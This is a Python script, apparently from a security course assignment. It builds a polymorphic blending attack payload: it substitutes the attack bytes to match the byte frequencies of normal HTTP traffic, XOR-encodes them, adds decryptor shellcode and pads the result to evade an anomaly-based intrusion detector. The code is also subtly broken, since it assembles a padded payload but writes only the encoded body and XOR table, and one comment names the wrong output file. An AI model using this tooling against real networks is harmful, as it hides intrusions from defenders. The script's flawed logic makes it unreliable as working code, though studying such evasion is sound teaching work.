#!/usr/bin/env python3

import struct
from collections import Counter
from substitution import *
from padding import *

ARTIFICIAL_PATH = "http_artificial_profile.pcap"
ATTACKBODY_PATH = "yhuang916.pcap"  # replace the file name by the one you downloaded

if __name__ == "__main__":
    attack_payload_bytes = getAttackBodyPayload(ATTACKBODY_PATH)
    artificial_payload_bytes = getArtificialPayload(ARTIFICIAL_PATH)

    # Generate substitution table based on byte frequency in file
    substitution_table = getSubstitutionTable(
        artificial_payload_bytes, attack_payload_bytes
    )

    # Substitution table will be used to encrypt attack body and generate corresponding
    # xor_table which will be used to decrypt the attack body
    (xor_table, adjusted_attack_body) = substitute(
        attack_payload_bytes, substitution_table
    )

    # For xor operation, should be a multiple of 4
    while len(xor_table) < 128:
        # CHECK: 128 can be some other number (greater than and multiple of 4)
        # per your attack trace length
        xor_table += b"\x00"

    # For xor operation, should be a multiple of 4
    while len(adjusted_attack_body) < 128:
        # CHECK: 128 can be some other number (greater than and multiple of 4) per
        # your attack trace length
        adjusted_attack_body += b"\x00"

    # Read in decryptor binary to append at the start of payload
    # Prepare byte list for payload
    with open("shellcode.bin", mode="rb") as file:
        shellcode_content = file.read()

    # Construct the raw payload with binary data
    raw_payload = shellcode_content + adjusted_attack_body + xor_table

    # The padding function is now expected to work with binary data directly.
    # It will append bytes to raw_payload to match the length of artificial_payload_bytes, if needed.
    padded_payload = padding(artificial_payload_bytes, raw_payload)

    # Write code here to generate payload.bin!
    # Write prepared payload to Output file
    # Note: Changed the output to 'output.bin' to reflect binary data handling
    with open("payload.bin", "wb") as payload_file:
        payload_file.write(adjusted_attack_body + xor_table)
